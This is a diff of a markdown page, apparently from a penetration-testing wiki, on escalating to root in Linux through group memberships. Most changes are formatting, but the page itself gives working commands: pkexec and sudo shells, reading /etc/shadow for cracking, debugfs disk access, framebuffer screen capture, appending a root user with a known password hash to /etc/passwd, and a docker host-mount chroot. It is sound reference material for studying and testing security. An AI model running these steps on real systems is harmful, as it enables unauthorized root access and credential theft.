@@ -4,7 +4,7 @@
 
 ### **PE - Method 1**
 
-**Sometimes**, **by default \(or because some software needs it\)** inside the **/etc/sudoers** file you can find some of these lines:
+**Sometimes**, **by default (or because some software needs it)** inside the **/etc/sudoers** file you can find some of these lines:
 
 ```bash
 # Allow members of group sudo to execute any command
@@ -16,9 +16,9 @@
 
 This means that **any user that belongs to the group sudo or admin can execute anything as sudo**.
 
-If this is the case, to **become root you can just execute**:
+If this is the case, to** become root you can just execute**:
 
-```text
+```
 sudo su
 ```
 
@@ -30,22 +30,22 @@ Find all suid binaries and check if there is the binary **Pkexec**:
 find / -perm -4000 2>/dev/null
 ```
 
-If you find that the binar**y pkexec is a SUID** binary and you belong to **sudo** or **admin**, you could probably execute binaries as sudo using `pkexec`.  
+If you find that the binar**y pkexec is a SUID** binary and you belong to **sudo **or **admin**, you could probably execute binaries as sudo using `pkexec`.\
 This is because typically those are the groups inside the **polkit policy**. This policy basically identifies which groups can use `pkexec`. Check it with:
 
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
 
-There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo** and **admin** appear.
+There you will find which groups are allowed to execute **pkexec** and **by default** in some linux disctros the groups **sudo **and** admin** appear.
 
-To **become root you can execute**:
+To** become root you can execute**:
 
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
 
-If you try to execute **pkexec** and you get this **error**:
+If you try to execute **pkexec **and you get this **error**:
 
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
@@ -53,7 +53,7 @@ polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freed
 Error executing command as another user: Not authorized
 ```
 
-**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012\#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
+**It's not because you don't have permissions but because you aren't connected without a GUI**. And there is a work around for this issue here: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). You need **2 different ssh sessions**:
 
 {% code title="session1" %}
 ```bash
@@ -74,23 +74,23 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 
 **Sometimes**, **by default** inside the **/etc/sudoers** file you can find this line:
 
-```text
+```
 %wheel	ALL=(ALL:ALL) ALL
 ```
 
 This means that **any user that belongs to the group wheel can execute anything as sudo**.
 
-If this is the case, to **become root you can just execute**:
+If this is the case, to** become root you can just execute**:
 
-```text
+```
 sudo su
 ```
 
 ## Shadow Group
 
-Users from the **group shadow** can **read** the **/etc/shadow** file:
+Users from the **group shadow** can **read **the **/etc/shadow** file:
 
-```text
+```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
 
@@ -98,7 +98,7 @@ So, read the file and try to **crack some hashes**.
 
 ## Disk Group
 
- This privilege is almost **equivalent to root access** as you can access all the data inside of the machine.
+ This privilege is almost** equivalent to root access **as you can access all the data inside of the machine.
 
 Files:`/dev/sd[a-z][1-9]`
 
@@ -118,7 +118,7 @@ debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
 
-However, if you try to **write files owned by root** \(like `/etc/shadow` or `/etc/passwd`\) you will have a "**Permission denied**" error.
+However, if you try to** write files owned by root **(like `/etc/shadow` or `/etc/passwd`) you will have a "**Permission denied**" error.
 
 ## Video Group
 
@@ -130,26 +130,26 @@ yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
 
-The **tty1** means that the user **yossi is logged physically** to a terminal on the machine.
+The **tty1 **means that the user **yossi is logged physically** to a terminal on the machine.
 
-The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to **grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
+The **video group** has access to view the screen output. Basically you can observe the the screens. In order to do that you need to** grab the current image on the screen** in raw data and get the resolution that the screen is using. The screen data can be saved in `/dev/fb0` and you could find the resolution of this screen on `/sys/class/graphics/fb0/virtual_size`
 
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
 
-To **open** the **raw image** you can use **GIMP**, select the **`screen.raw`** file and select as file type **Raw image data**:
+To **open **the **raw image** you can use **GIMP**, select the **`screen.raw` **file and select as file type **Raw image data**:
 
-![](../../../.gitbook/assets/image%20%28208%29.png)
+![](<../../../.gitbook/assets/image (287).png>)
 
-Then modify the Width and Height to the ones used on the screen and check different Image Types \(and select the one that shows better the screen\):
+Then modify the Width and Height to the ones used on the screen and check different Image Types (and select the one that shows better the screen):
 
-![](../../../.gitbook/assets/image%20%28295%29.png)
+![](<../../../.gitbook/assets/image (288).png>)
 
 ## Root Group
 
-It looks like by default **members of root group** could have access to **modify** some **service** configuration files or some **libraries** files or **other interesting things** that could be used to escalate privileges...
+It looks like by default** members of root group** could have access to **modify **some **service **configuration files or some **libraries **files or** other interesting things** that could be used to escalate privileges...
 
 **Check which files root members can modify**:
 
@@ -173,9 +173,11 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
 
-Finally, if you don't like any of the suggestions of before, or they aren't working for some reason \(docker api firewall?\) you could always try to **run a privileged container and escape from it** as explained here:
+Finally, if you don't like any of the suggestions of before, or they aren't working for some reason (docker api firewall?) you could always try to** run a privileged container and escape from it** as explained here:
 
-{% page-ref page="../docker-breakout.md" %}
+{% content-ref url="../docker-breakout/" %}
+[docker-breakout](../docker-breakout/)
+{% endcontent-ref %}
 
 If you have write permissions over the docker socket read [**this post about how to escalate privileges abusing the docker socket**](../#writable-docker-socket)**.**
 
@@ -185,15 +187,16 @@ If you have write permissions over the docker socket read [**this post about how
 
 ## lxc/lxd Group
 
-{% page-ref page="./" %}
+{% content-ref url="./" %}
+[.](./)
+{% endcontent-ref %}
 
 ## Adm Group
 
-Usually **members** of the group **`adm`** have permissions to **read log** files located inside _/var/log/_.  
+Usually **members **of the group **`adm`** have permissions to **read log **files located inside _/var/log/_.\
 Therefore, if you have compromised a user inside this group you should definitely take a **look to the logs**.
 
 ## Auth group
 
-Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.  
+Inside OpenBSD the **auth** group usually can write in the folders _**/etc/skey**_ and _**/var/db/yubikey**_ if they are used.\
 These permissions may be abused with the following exploit to **escalate privileges** to root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
-
